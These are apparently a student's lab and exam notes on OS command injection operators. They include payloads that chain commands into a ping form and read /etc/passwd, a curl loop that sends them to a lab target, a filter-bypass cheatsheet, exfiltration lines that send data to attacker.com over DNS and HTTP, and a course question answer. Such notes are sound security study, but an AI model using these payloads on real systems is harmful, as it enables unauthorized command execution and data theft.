# Section 4 — Other Injection Operators

---

## Operator Comparison

Run `ping -c 1 127.0.0.1 <OPERATOR> whoami` — see what comes back:

| Operator | Char | Output behavior | When to use |
|----------|------|-----------------|-------------|
| `;` | `%3b` | Both, in order | Default — most universal |
| `\n` | `%0a` | Both, in order | When `;` filtered |
| `&` | `%26` | Both — second shown first (backgrounded) | When you need first to finish quickly |
| `\|` | `%7c` | **Second only** | Cleanest output — hides ping noise |
| `&&` | `%26%26` | Both, only if first succeeded | When first command might error |
| `\|\|` | `%7c%7c` | Second only, only if first failed | When you want to break the first intentionally |
| `` ` `` | `%60` | Inline substitution (Linux) | Useful inside quoted args |
| `$()` | `%24%28%29` | Inline substitution (Linux) | Modern alternative to backticks |

> Different operators bypass different filters. Test all of them when a filter is in place.

---

## Pipe (`|`) — Cleanest Injection Output

The pipe (`|`) sends the standard output of the first command into the second command. Since `ping` writes to standard output and `whoami` ignores standard input, only `whoami`'s output appears:

```bash
ping -c 1 127.0.0.1 | whoami
# www-data    ← only whoami's output
```
> The pipe discards `ping`'s output and passes it to `whoami`, which ignores it. Only `whoami`'s result is returned. Use `|` when you want clean output with no ping noise.

Good for clean exfiltration when the response only shows the last command's output:
```
ip=127.0.0.1|whoami        →  www-data
ip=127.0.0.1|id            →  uid=33(www-data) gid=33(www-data)
ip=127.0.0.1|cat /etc/passwd
```

---

## `||` (OR) — Force the Injection by Failing First

The OR operator (`||`) runs the second command only if the first one fails (exit code is not zero). This is useful when:
- You don't want the first command's output cluttering the response
- The original command always fails anyway (for example, if you give a non-IP value)

```bash
ping -c 1 || whoami
# ping: usage error: Destination address required
# www-data
```
> `ping -c 1` with no destination fails immediately. The `||` then triggers `whoami`. Use this pattern when you want only your command's output with no ping noise.

Lab payload:
```
ip=||whoami     →  whoami runs cleanly because ping errors
```

---

## `&&` (AND) — Conditional Chain

The AND operator (`&&`) runs the second command only if the first one succeeds. It is useful when:
- You need a valid first command to avoid suspicion
- The filter only allows valid input but does not filter operators

```bash
ping -c 1 127.0.0.1 && whoami
# PING ... 1 packets received ...
# www-data
```
> Both commands run in sequence. `whoami` only runs if `ping` exits with code 0. Both outputs appear in the response.

---

## `&` (Background) — Async Execution

The `&` operator runs the first command in the background and immediately starts the second. Output order is unpredictable — usually the second command's output appears first because the background ping takes longer.

```bash
ping -c 1 127.0.0.1 & whoami
# www-data
# PING ... time=0.065 ms
# 1 packets transmitted, 1 received
```
> `ping` starts in the background (`&`). `whoami` runs immediately and returns its output first. Useful when you want fast injection output without waiting for the first command to finish.

Useful when:
- You want fast injection output (don't wait for ping to finish)
- Background command might run async on the server

---

## Inline Substitution — `` `cmd` `` and `$(cmd)`

Bash evaluates the substitution first and replaces it with the output. Then it runs the surrounding command with that output inserted.

```bash
ping -c 1 `whoami`    →  ping -c 1 www-data    (fails — not an IP)
ping -c 1 $(whoami)   →  ping -c 1 www-data    (fails)
```
> Backticks (`` ` ``) and `$()` are equivalent — both run the inner command and substitute its output. `$()` is preferred because it nests cleanly and is easier to read.

For these to be useful, the substituted command needs to return something the outer command accepts:
```bash
ping -c 1 $(hostname)     # hostname returns a valid hostname → ping succeeds
echo "result: $(whoami)"  # → result: www-data
```
> `$(hostname)` returns a resolvable name, so ping succeeds. Use inline substitution when the server reflects error output or you need the injected result inside another command's arguments.

Useful for blind injection where you want command output sent over the network:
```bash
ping -c 1 $(whoami).attacker.com   # DNS query goes out as "www-data.attacker.com"
curl http://attacker.com/$(id|base64)  # exfil via HTTP
```
> The DNS lookup for `www-data.attacker.com` leaks the username. The `curl` path leaks the full `id` output base64-encoded. Both techniques work even when the server does not display command output directly.

---

## Operators by Injection Type (cheatsheet from section)

| Injection | Operators |
|-----------|-----------|
| SQL Injection | `' " ; -- /* */` |
| OS Command Injection | `; & \| && \|\| && $() ` |
| LDAP Injection | `* ( ) & \|` |
| XPath Injection | `' or and not substring concat count` |
| Code Injection | `' ; -- /* */ $() ${} #{} %{} ^` |
| Path Traversal | `../  ..\\  %00` |
| Header Injection (CRLF) | `\n \r\n \t %0d %0a %09` |
| Shellcode Injection | `\x \u %u %n` |

---

## Lab — Compare Operators

**Target:** `154.57.164.66:32362`

### Test each operator
```bash
for payload in "127.0.0.1%0awhoami" "127.0.0.1+%26+whoami" "127.0.0.1+%7c+whoami"; do
  echo "=== $payload ==="
  curl -sk -X POST "http://TARGET/" -d "ip=$payload" | sed -n '/<pre>/,/<\/pre>/p'
done
```
> Tests newline (`%0a`), background (`%26`/`&`), and pipe (`%7c`/`|`) operators in one loop. `sed` extracts only the `<pre>` response block. Replace `TARGET` with the lab IP:port.

Output comparison:

**newline (`%0a`)** — both, in order:
```
PING 127.0.0.1 ... time=0.071 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received...
www-data
```

**`&` (background)** — both, whoami first:
```
www-data
PING 127.0.0.1 ... time=0.065 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received...
```

**`|` (pipe)** — only whoami:
```
www-data
```

**Q1 Answer:** `|` (pipe — only shows the second command's output)

---

## Exam Notes

- `|` (pipe) is the **cleanest operator** when you only care about your injected command's output — no ping noise to scroll through
- `||` works the same way but requires deliberately breaking the first command — use when the filter accepts only specific input
- `&` puts the first command in background — useful when the first is slow or you want second's output immediately
- `$()` and backticks are great for **blind injection** with DNS/HTTP exfil (`ping -c 1 $(whoami).attacker.com`)
- Different filters block different operators — when one fails, try the next. The Section 4 table is your bypass reference.
- The "show only second output" question is a clue that `|` (pipe) is the standard cheat-sheet entry for clean output
